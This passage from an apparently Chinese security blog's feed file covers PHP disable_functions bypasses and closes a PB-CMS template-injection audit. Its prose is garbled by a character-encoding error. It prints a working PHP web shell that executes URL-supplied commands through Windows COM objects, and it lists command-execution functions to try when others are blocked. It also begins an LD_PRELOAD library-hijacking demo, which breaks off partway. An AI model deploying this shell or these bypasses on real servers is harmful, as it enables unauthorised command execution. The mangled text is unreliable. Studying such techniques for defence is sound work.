class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÁßçÂ∞±‰∏çËÉΩÊúâËøîÂõûÂÄºÔºåÊúâ‰∫ÜÂèçËÄå‰∏ç‰ºöÂØºËá¥‰ª£Á†ÅÊâßË°åÔºåËøô‰∏™Ë¶ÅÊâßË°åÊòØË¶ÅË∞ÉÁî®Âà∞<code>applyDefaultViewName</code>ÊñπÊ≥ïÔºåÈáåÈù¢‰ºöÂà§Êñ≠ÂΩì<code>ModelAndView</code>‰∏∫Á©∫ÔºåÂàôÈÄöËøá<code>getDefaultViewName</code>Ëé∑ÂèñËØ∑Ê±ÇË∑ØÂæÑ‰Ωú‰∏∫<code>ViewName</code>ÔºåÊõ¥ËØ¶ÁªÜÁöÑÂ∞±‰∏çÁúã‰∫ÜÔºåËøô‰∏™ÊºèÊ¥ûËøòÊúâÂæÖÊõ¥Ê∑±ÂÖ•ÁöÑÂ≠¶‰π†<br>ÂõûÂΩíÊºèÊ¥ûÔºåÂÖàÂ§çÁé∞‰∏Ä‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317109.png"><br>Âú®‰∏ªÈ¢òÁÆ°ÁêÜËøôÈáåÊñ∞Â¢û‰∏™‰∏ªÈ¢òÔºåÁÑ∂ÂêéÂêØÁî®ËÆøÈóÆÂâçÂè∞Âç≥ÂèØËß¶Âèë<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317240.png"></p><h3 id="‰ª£Á†ÅÂàÜÊûê-1"><a href="#‰ª£Á†ÅÂàÜÊûê-1" class="headerlink" title="‰ª£Á†ÅÂàÜÊûê"></a>‰ª£Á†ÅÂàÜÊûê</h3><p>Êù•Âà∞Â¶Ç‰∏ã‰ΩçÁΩÆ‰∏ãÊñ≠ÁÇπË∞ÉËØï‰∏Ä‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191037209.png"><br>ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÂíåÊàë‰ª¨Á¨¨‰∏ÄÁßçÊÉÖÂÜµÁöÑÂÜôÊ≥ïÂü∫Êú¨‰∏ÄÊ†∑ÔºåËøôÈáåÈÄöËøáÔºå<code>bizThemeService.selectCurrent().getName()</code>Ëé∑ÂèñÂà∞Êàë‰ª¨ÁöÑËæìÂÖ•ÁÑ∂ÂêéËøîÂõûÈÄ†Êàê‰∫ÜÊ®°ÊùøÊ≥®ÂÖ•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317623.png"><br>ÊÑüËßâËøô‰∏™ÂÆ°Âá∫Êù•‰πüÊå∫ÁåõÔºå‰∏∫‰ªÄ‰πàÂ∞±ËÉΩÁúãÂá∫Êù•ÈÇ£‰∏™ÊòØÊàë‰ª¨ÂêéÂè∞ÂèØÊéßÁöÑÂë¢Ôºü<br>ÊàëÂ∞ùËØïËá™Â∑±Ë∑ü‰∏Ä‰∏ãÁúãÁúãÔºåÊâæ‰∫ÜÂçäÂ§©Áªà‰∫éÂú®‰∏ãÈù¢ËøôÈáåÊâæÊâìÊñ∞Â¢û‰∏ªÈ¢ò‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317754.png"><br>Ëøô‰∏™Êó∂ÂÄôÂèØ‰ª•ÁúãÂà∞Êàë‰ª¨ÁöÑÂèÇÊï∞Â∑≤ÁªèË¢´‰º†ËøõÊù•‰∫ÜÔºåÂ∞±Âú®<code>bizTheme</code>Ëøô‰∏™ÈáåÈù¢ÔºåÊâÄ‰ª•ËøòÂæóÁªßÁª≠ÂæÄÂâçÊé®ËøõÔºåÂú®Ëøô‰∏™BizThemeÁ±ª‰∏ãÊâæÂà∞ÂÆö‰πâÁöÑÂèÇÊï∞<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317633.png"><br>ÈáåÈù¢Êúâ‰∏™<code>@Data</code>Ê≥®Ëß£Áõ∏ÂΩì‰∫éÊúâgetterÂíåsetter‰∫ÜÂÆû‰æãÂåñÁöÑÊó∂ÂÄôÂ∞±‰ºöËá™Âä®ËµãÂÄº‰∫ÜÔºåÁÑ∂ÂêéÁªìÂêà‰∏äÈù¢ÁöÑ<code>@PostMapping</code>Ê≥®Ëß£Âç≥ÂèØÁêÜËß£‰∏∫ÂèØÊéßÔºåÁúãÁúãGPTÊÄé‰πàËØ¥ÁöÑÔºåÊ†πÊçÆSpring MVCÁöÑÂ∑•‰ΩúÂéüÁêÜÔºåÂΩìÊé•Êî∂Âà∞‰∏Ä‰∏™POSTËØ∑Ê±ÇÊó∂ÔºåSpring‰ºöÂ∞ùËØïÂ∞ÜËØ∑Ê±Ç‰Ωì‰∏≠ÁöÑÊï∞ÊçÆÊò†Â∞ÑÂà∞ÊñπÊ≥ïÁöÑÂèÇÊï∞‰∏äÔºåÊâÄ‰ª•ËøôÈáåÂèØÊéß</p><h2 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h2><p>Á®çÂæÆÂ≠¶‰π†‰∫Ü‰∏Ä‰∏ãÊñ∞Ê¥ûÔºåÂêéÈù¢ËøòÊúâ‰∏™Êñá‰ª∂‰∏ä‰º†‰∏çÁü•ÈÅìÊòØ‰∏çÊòØÊàëÊâæÁöÑÊé•Âè£‰∏çÂØπÊ≤°ËÉΩÂà©Áî®ÊàêÂäüÔºåÊÉ≥Â≠¶‰π†ÁöÑÂ∏àÂÇÖÂèØ‰ª•ÂèÇËÄÉ<a href="https://gitee.com/LinZhaoguan/pb-cms/issues/I8T4WR">File upload vulnerability ¬∑ Issue #I8T4WR ¬∑ LinZhaoguan&#x2F;pb-cms - Gitee.com</a><br>Ëøô‰∏™issueËá™Â∑±ÂéªÁêÜËß£‰∏Ä‰∏ã</p><h2 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h2><p><a href="https://tttang.com/archive/1592/">https://tttang.com/archive/1592/</a><br><a href="https://wsyu9a.github.io/blog/2024/03/05/240304PB-CMS/">https://wsyu9a.github.io/blog/2024/03/05/240304PB-CMS/</a><br><a href="https://www.cnblogs.com/TT0TT/p/16845759.html">Ê®°ÊùøÊ≥®ÂÖ•‚ÄìSpring boot Thymeleaf Ê®°ÊùøÊ≥®ÂÖ• - TT0TT - ÂçöÂÆ¢Âõ≠ (cnblogs.com)</a><br><a href="https://xz.aliyun.com/t/10514">https://xz.aliyun.com/t/10514</a></p>]]></content>
      
      
      <categories>
          
          <category> ‰ª£Á†ÅÂÆ°ËÆ° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>disable_functionsÁªïËøáÊÄªÁªì</title>
      <link href="/2023/12/disable-functions%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
      <url>/2023/12/disable-functions%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="ÈªëÂêçÂçïÁªïËøáÔºàÂ∏∏ËßÑÊâãÊÆµÔºâ"><a href="#ÈªëÂêçÂçïÁªïËøáÔºàÂ∏∏ËßÑÊâãÊÆµÔºâ" class="headerlink" title="ÈªëÂêçÂçïÁªïËøáÔºàÂ∏∏ËßÑÊâãÊÆµÔºâ"></a>ÈªëÂêçÂçïÁªïËøáÔºàÂ∏∏ËßÑÊâãÊÆµÔºâ</h2><p>Ëøô‰∏™ÁªïËøáÂ∞±ÊòØÂà©Áî®ÈªëÂêçÂçï‰πãÂ§ñÁöÑÂáΩÊï∞ÂéªÊâßË°åÂëΩ‰ª§Ôºå‰ΩÜÊòØÊàëÂú®ÊµãËØïËøô‰∏™ÈªëÂêçÂçïÁªïËøáÁöÑÊó∂ÂÄôÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂæàËø∑ÊÉëÁöÑÁÇπÔºåÂú®Windows‰∏ãÊàëÁ¶ÅÁî®‰∫ÜevalÂíåsystemÂáΩÊï∞hackbarÁ°ÆÂÆû‰∏çËÉΩÊâßË°åsystemÂáΩÊï∞‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061648901.png" alt="image-20231206164832783"><br>‰ΩÜÊòØËöÅÂâë‰∏äÈù¢‰ªªÁÑ∂ÂèØ‰ª•ÂëΩ‰ª§ÊâßË°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061649793.png" alt="image-20231206164914744"><br>Âè¶Â§ñevalÂáΩÊï∞‰πü‰ªªÁÑ∂ÂèØ‰ª•ÊâßË°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061649600.png" alt="image-20231206164939494"><br>Â≤Ç‰∏çÊòØÁõ∏ÂΩì‰∫éÁ¶ÅÁî®evalÂáΩÊï∞Ê≤°Áî®ÔºüÔºüËøô‰∏™Êó∂ÂÄôÁöÑphpÁâàÊú¨‰∏∫5.4.45ÔºåÁÑ∂ÂêéÊòØLinux‰∏ãÁöÑÊµãËØïÔºåÊàë‰πüÁ¶ÅÁî®‰∫Üeval„ÄÅsystemÂÅöÊµãËØïÔºåevalÂáΩÊï∞ÁÖßÊ†∑Ê≠£Â∏∏ÊâßË°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061649382.png" alt="image-20231206164953272"><br>ÁÑ∂ÂêéÂ∞ùËØïsystemÂáΩÊï∞<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061650540.png" alt="image-20231206165006450"><br>ÁÑ∂ÂêéÂ∞ùËØïÁî®‰ª•ËöÅÂâëÂéªÊâßË°åÂëΩ‰ª§<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061650970.png"><br>ËöÅÂâëËøòÊòØÂèØ‰ª•Ê≠£Â∏∏ÊâßË°åÂëΩ‰ª§ÔºåÁÑ∂ÂêéÊàëÂÜçÁΩë‰∏äÊâæ‰∫Ü‰∏Ä‰∏ãÁªèÂ∏∏Á¶ÅÊéâÁöÑÂáΩÊï∞ÂÖ®ÈÉ®Âä†‰∏äÂéª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec,passthru,popen,shell_exec,proc_open,proc_terminate,curl_exec,curl_multi_exec,show_source,touch,escapeshellcmd,escapeshellarg,<span class="keyword">eval</span>,system</span><br></pre></td></tr></table></figure><p>Ê≠§Êó∂ËöÅÂâëÊó†Ê≥ïÊ≠£Â∏∏ÂëΩ‰ª§ÊâßË°å‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061650948.png"><br>ÁÑ∂ÂêéÊàëÂú®Windows‰∏ã‰πüÂä†‰∏äÈÇ£‰∏ÄÂ†ÜÂáΩÊï∞ÔºåÁÑ∂ÂêéËöÅÂâëÊ≠§Êó∂‰πüÊó†Ê≥ïÊ≠£Â∏∏ÂëΩ‰ª§ÊâßË°å‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061650485.png" alt="image-20231206165049441"><br>ÁÑ∂ÂêéÊääsystemÊîæÂá∫Êù•‰πãÂêéÂèØ‰ª•Ê≠£Â∏∏ÊâßË°åÂëΩ‰ª§ÔºåÊ≠§Êó∂Â∞±ÁåúÊµãËöÅÂâëÁöÑÈÇ£‰∏™ÁªàÁ´ØÁöÑÂëΩ‰ª§ÊâßË°åÂΩìsystemÁî®‰∏ç‰∫ÜÁöÑÊó∂ÂÄô‰ºöÂéªÂ∞ùËØïÁî®ÂÖ∂ÂÆÉÁöÑÂáΩÊï∞ÊâßË°åÂëΩ‰ª§ÔºåÂ∫îËØ•ÊòØÂÜÖÁΩÆ‰∫Ü‰∏ÄÂ†ÜÂëΩ‰ª§ÊâßË°åÁöÑÂáΩÊï∞ÔºåÊ≤°ÊúâÁ†îÁ©∂ËøáËöÅÂâëÁöÑÊ∫êÁ†ÅÔºå‰ΩÜÊòØÊàëËßâÂæóÊàëÁöÑÁåúÊµãÂÖ´‰πù‰∏çÁ¶ªÂçÅÔºå‰ΩÜÊòØÂØπ‰∫éÈÇ£‰∏™evalÂáΩÊï∞ÁöÑÁ¶ÅÁî®ËøòÊòØÊ≤°ÊáÇ‰∏∫‰ªÄ‰πàÁ¶ÅÁî®‰∏ç‰∫ÜÔºåÈöæÈÅìÊòØÂõ†‰∏∫Êó†Ê≥ïÂÅöÂëΩ‰ª§ÊâßË°åÂè™ËÉΩÊâßË°åÊüê‰∏™ÂáΩÊï∞ÊâÄ‰ª•‰∏çÈôêÂà∂ÔºüÔºü<br>‰∏äÈù¢ÁöÑÁñëÊÉëÁªìÊùüÔºåËøô‰∏™ÈÉ®ÂàÜÁöÑÈªëÂêçÂçïÁªïËøá‰πüÂ∞±ÊòØÊâæ‰∏Ä‰∫õÊ≤°ÊúâË¢´ÂäûÊéâÂèØ‰ª•ÂëΩ‰ª§ÊâßË°åÁöÑÂáΩÊï∞ÔºåÂΩìÁÑ∂Âè™ËÉΩÂà©Áî®hackbarÂú®ÁΩëÈ°µ‰∏äÊâßË°åÔºåÂõ†‰∏∫ËöÅÂâëÈáåÈù¢‰∏ç‰∏ÄÂÆöÂÜÖÁΩÆ‰∫ÜÈÇ£‰∏™ÂáΩÊï∞Êó†Ê≥ï‰ΩøÁî®ÁªàÁ´ØÂéªÊâßË°åÂëΩ‰ª§ÔºåÂèÇËÄÉ<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">l3m0n&#x2F;Bypass_Disable_functions_Shell: ‰∏Ä‰∏™ÂêÑÁßçÊñπÂºèÁ™ÅÁ†¥Disable_functionsËææÂà∞ÂëΩ‰ª§ÊâßË°åÁöÑshell (github.com)</a>ËØ•È°πÁõÆÔºå‰∏ÄËà¨ÁöÑÁ¶ÅÁî®ÂàóË°®Â¶Ç‰∏ãÔºåÂèØ‰ª•‰ªéËøô‰∏™ÈáåÈù¢ÊâæÊºèÁΩë‰πãÈ±ºÔºåÂ¶ÇÊûúÊúâÂÜçÂéªÊâæÂáΩÊï∞ÁöÑËØ¶ÁªÜÁî®Ê≥ï</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link</span><br></pre></td></tr></table></figure><p>‰∏ÄËà¨Áõ¥Êé•ÂëΩ‰ª§ÊâßË°åÁöÑÂáΩÊï∞Â∞±‰∏ãÈù¢Âá†‰∏™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec„ÄÅshell_exec„ÄÅsystem„ÄÅpassthru„ÄÅpopen„ÄÅproc_open</span><br></pre></td></tr></table></figure><h2 id="Âà©Áî®WindowsÁªÑ‰ª∂COMÁªïËøá"><a href="#Âà©Áî®WindowsÁªÑ‰ª∂COMÁªïËøá" class="headerlink" title="Âà©Áî®WindowsÁªÑ‰ª∂COMÁªïËøá"></a>Âà©Áî®WindowsÁªÑ‰ª∂COMÁªïËøá</h2><h4 id="Âà©Áî®Êù°‰ª∂"><a href="#Âà©Áî®Êù°‰ª∂" class="headerlink" title="Âà©Áî®Êù°‰ª∂"></a>Âà©Áî®Êù°‰ª∂</h4><ul><li>phpinfo()‰∏≠ËÉΩÊêúÂà∞com.allow_dcomÔºåÂç≥ÂÅö‰∫ÜÈÖçÁΩÆÔºåÈªòËÆ§Ê≤°ÂÅö<br>Ëøô‰∏™ÁªÑ‰ª∂ÈªòËÆ§ÊòØÊ≤°ÊúâÂÅöÈÖçÁΩÆÁöÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061651807.png" alt="image-20231206165114747"><br>ÈúÄË¶ÅÂä†‰∏ä<code>extension=php_com_dotnet.dll</code>ÔºåÁÑ∂ÂêéÂ∞Ü<code>com.allow_dcom = true</code>ÂâçÈù¢ÁöÑÂàÜÂè∑ÂéªÊéâ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061651356.png" alt="image-20231206165131300"><br>ËøôÊ†∑ÈÖçÁΩÆÂêéÂç≥ÂèØÂú®phpinfo‰∏≠ÊêúÂà∞<code>com.allow_dcom</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061651232.png" alt="image-20231206165142182"><br>Â¶ÇÊûú‰∏ÄÂè∞WindowsÊúçÂä°Âô®ÂÅö‰∫ÜËøô‰∏™ÈÖçÁΩÆÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•Âà©Áî®Ëøô‰∏™Êù•ÁªïËøáÔºåÂç≥ÂàõÂª∫‰∏Ä‰∏™COMÂØπË±°,ÈÄöËøáË∞ÉÁî®COMÂØπË±°ÁöÑ<code>exec</code>ÊõøÊàë‰ª¨ÊâßË°åÂëΩ‰ª§Ôºå‰∏ä‰º†Â¶Ç‰∏ã‰ª£Á†ÅÂç≥ÂèØ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061651556.png" alt="image-20231206165154479"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wsh&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;wsh&#x27;</span>] : <span class="string">&#x27;wscript&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$wsh</span> == <span class="string">&#x27;wscript&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$wshit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Create Wscript.Shell Failed!&quot;</span>);</span><br><span class="line">    <span class="variable">$exec</span> = <span class="variable">$wshit</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>);</span><br><span class="line">    <span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line">    <span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$wsh</span> == <span class="string">&#x27;application&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$wshit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&quot;Shell.Application&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Shell.Application Failed!&quot;</span>);</span><br><span class="line">    <span class="variable">$exec</span> = <span class="variable">$wshit</span>-&gt;<span class="title function_ invoke__">ShellExecute</span>(<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c &quot;</span>.<span class="variable">$command</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061652699.png" alt="image-20231206165205647"><br>Ëøô‰∏™Âà©Áî®ÁöÑÊòØCOM‰∏ãÁöÑexecÁõ¥Êé•Êù•ÂëΩ‰ª§ÊâßË°åÔºåËá≥‰∫éÊÄé‰πàÂà©Áî®ÁöÑÂèØ‰ª•ÂèÇËÄÉ<a href="https://learn.microsoft.com/zh-cn/windows/win32/com/com-technical-overview">COM ÊäÄÊúØÊ¶ÇËø∞ - Win32 apps | Microsoft Learn</a>ÊàëËøôÈáåÂ∞±‰∏çÁ†îÁ©∂‰∫Ü</li></ul><h2 id="Âà©Áî®LinuxÁéØÂ¢ÉÂèòÈáèLD-PRELOAD"><a href="#Âà©Áî®LinuxÁéØÂ¢ÉÂèòÈáèLD-PRELOAD" class="headerlink" title="Âà©Áî®LinuxÁéØÂ¢ÉÂèòÈáèLD_PRELOAD"></a>Âà©Áî®LinuxÁéØÂ¢ÉÂèòÈáèLD_PRELOAD</h2><p>ÊÑüËßâËøô‰∏™ÊòØÈù¢ËØïÊàñËÄÖCTFÈáåÈù¢ËÄÉÁöÑÊúÄÂ§öÁöÑÔºåÂÖàÁúã‰∏Ä‰∏ãLD_PRELOADÊòØ‰ªÄ‰πà<br>ÊëòÊäÑÔºåÊÑüËßâËß£ÈáäÁöÑÊå∫Â•Ω</p><blockquote><p>LD_PRELOAD ÊòØ‰∏Ä‰∏™ÂèØÈÄâÁöÑ Unix ÁéØÂ¢ÉÂèòÈáèÔºåÂåÖÂê´‰∏Ä‰∏™ÊàñÂ§ö‰∏™ÂÖ±‰∫´Â∫ìÊàñÂÖ±‰∫´Â∫ìÁöÑË∑ØÂæÑÔºåÂä†ËΩΩÁ®ãÂ∫èÂ∞ÜÂú®ÂåÖÂê´ C ËøêË°åÊó∂Â∫ìÔºàlibc.soÔºâÁöÑ‰ªª‰ΩïÂÖ∂‰ªñÂÖ±‰∫´Â∫ì‰πãÂâçÂä†ËΩΩËØ•Ë∑ØÂæÑ„ÄÇËøôÁß∞‰∏∫È¢ÑÂä†ËΩΩÂ∫ì„ÄÇ<br>‰πüÂ∞±ÊòØËØ¥ÂÆÉÂèØ‰ª•ÂΩ±ÂìçÁ®ãÂ∫èÁöÑËøêË°åÊó∂ÁöÑÈìæÊé•ÔºàRuntime linkerÔºâÔºåÂÆÉÂÖÅËÆ∏‰Ω†ÂÆö‰πâÂú®Á®ãÂ∫èËøêË°åÂâç‰ºòÂÖàÂä†ËΩΩÁöÑÂä®ÊÄÅÈìæÊé•Â∫ì„ÄÇÂç≥Êàë‰ª¨ÂèØ‰ª•Ëá™Â∑±ÁîüÊàê‰∏Ä‰∏™Âä®ÊÄÅÈìæÊé•Â∫ìÂä†ËΩΩÔºå‰ª•Ë¶ÜÁõñÊ≠£Â∏∏ÁöÑÂáΩÊï∞Â∫ìÔºå‰πüÂèØ‰ª•Ê≥®ÂÖ•ÊÅ∂ÊÑèÁ®ãÂ∫èÔºåÊâßË°åÊÅ∂ÊÑèÂëΩ‰ª§„ÄÇ</p></blockquote><p>Âç≥LD_PRELOADÊòØËÆæÁΩÆ‰Ω†Êüê‰∏™Á®ãÂ∫èËøêË°åÊó∂ÂéªÂì™Âä†ËΩΩ‰Ω†ÁöÑÂä®ÊÄÅÈìæÊé•Â∫ìÁöÑ‰∏Ä‰∏™ÁéØÂ¢ÉÂèòÈáèÔºåÊó¢ÁÑ∂ÂèØ‰ª•Ëá™Â∑±ÊåáÂÆöËøô‰∏™Ë∑ØÂæÑÈÇ£‰πàÂ∞±ÊúâÊìç‰ΩúÁöÑÁ©∫Èó¥‰∫ÜÔºåÂ∞±ÂèØ‰ª•Ëá™Â∑±ËÆæÁΩÆ‰∏™ÊÅ∂ÊÑèÁöÑÁ®ãÂ∫èË∑ØÂæÑ</p><p>Âä®ÊÄÅÈìæÊé•Â∫ìÂèàÊòØ‰ªÄ‰πàÂë¢ÔºåÁªßÁª≠ÊëòÊäÑ</p><blockquote><p>ÁÆÄÂçïÊù•ËØ¥‰∏Ä‰∏™Ê≠£Â∏∏Á®ãÂ∫èÂú®ËøêË°åÊó∂‰ºöË∞ÉÁî®‰∏çÂêåÁöÑÈìæÊé•ÔºåÊØîÂ¶ÇcÔºåË∞ÉÁî®hÔºå‰πüÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî®soÔºàwinÁöÑËØùÂ∞±ÊòØdllÔºâÔºåËøô‰∫õÈìæÊé•Â∫ìÂéª‰ΩøÁî®‰ªñ‰ª¨ÁöÑÂ∫ì</p></blockquote><p>ÊÑüËßâÂ∞±ÊòØÂú®ËøêË°åCÊàñËÄÖpythonÊó∂‰Ω†ÊåáÂÆö‰∏Ä‰∏™Â§¥Êñá‰ª∂ÊàñËÄÖÂ∫ìÔºåÁÑ∂ÂêéÂ∞±ÂèØ‰ª•Ë∞ÉÁî®ÈáåÈù¢ÁöÑÂáΩÊï∞ÔºåÂä®ÊÄÅÂ∞±ÊòØÂú®‰Ω†ËøêË°åËøô‰∏™Á®ãÂ∫èÊó∂ÂéªË∞ÉÁî®ÔºåËøôÊ†∑ÁêÜËß£Â∫îËØ•Ê≤°Èîô<br>Ê¶ÇÂøµÂ∑Æ‰∏çÂ§ö‰∫ÜÔºå‰∏ãÈù¢ÁúãÊÄé‰πàÂà©Áî®Ëøô‰∏™</p><h3 id="Âü∫Êú¨ÊºîÁ§∫"><a href="#Âü∫Êú¨ÊºîÁ§∫" class="headerlink" title="Âü∫Êú¨ÊºîÁ§∫"></a>Âü∫Êú¨ÊºîÁ§∫</h3><h4 id="id"><a href="#id" class="headerlink" title="id"></a>id</h4><p>ËøôÈáåÊãøidÂëΩ‰ª§Êù•Áúã‰∏Ä‰∏ãLD_PERLOADÁöÑÂü∫Êú¨Áî®Ê≥ïÂêß<br>Âà©Áî®‰∏ãÈù¢ÂëΩ‰ª§Êü•Áúã‰∏Ä‰∏ãidÂ∫ïÂ±ÇË∞ÉÁî®‰∫ÜÂì™‰∫õÂáΩÊï∞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -Ws /usr/bin/id</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061652560.png" alt="image-20231206165223464"><br>ÂÖ∂‰∏≠Â∞±‰ΩøÁî®‰∫ÜgetuidËøô‰∏™ÂáΩÊï∞Ôºå‰ΩÜÊòØÊâæ‰∫ÜÂçäÂ§©Ëøô‰∏™ÂáΩÊï∞ÁöÑÂéüÊú¨‰ª£Á†ÅÊ≤°ÊâæÂà∞Ôºå‰∏çÁü•ÈÅìÊÄé‰πàÊâæÔºåÈ∫ª‰∫Ü„ÄÇ„ÄÇ„ÄÇÂÖàÊîæÁùÄÁªßÁª≠ÂæÄ‰∏ã<br>‰∏ãÈù¢ÁîüÊàê‰∏Ä‰∏™.soÊñá‰ª∂ÔºåÂÖàÂÜô‰∏™.cÂéüÊú¨ÁöÑgetuidÂáΩÊï∞Â∫îËØ•‰∏çÊòØËøôÊ†∑ÁöÑ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getuid</span><span class="params">()</span>&#123;        </span><br><span class="line">  <span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>)&#123;        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;        </span><br><span class="line">  &#125;        </span><br><span class="line">  unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);#Ëß£Èô§ÊçÜÁªëÔºåÂê¶ÂàôÂÆπÊòìÂá∫Áé∞Ê≠ªÂæ™ÁéØÁöÑÂ•áÊÄ™Áä∂ÂÜµ        </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;success\n&quot;</span>);        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÁºñËØë‰∏∫.soÊñá‰ª∂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC test.c -o test</span><br><span class="line">gcc --share test -o test.so</span><br></pre></td></tr></table></figure><p>ÂÜçËÆæÁΩÆÁéØÂ¢ÉÂèòÈáè</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD=./test.so</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÊâßË°åidÂèØ‰ª•ÁúãÂà∞printfÂÖàË¢´ÊâßË°å‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061653723.png" 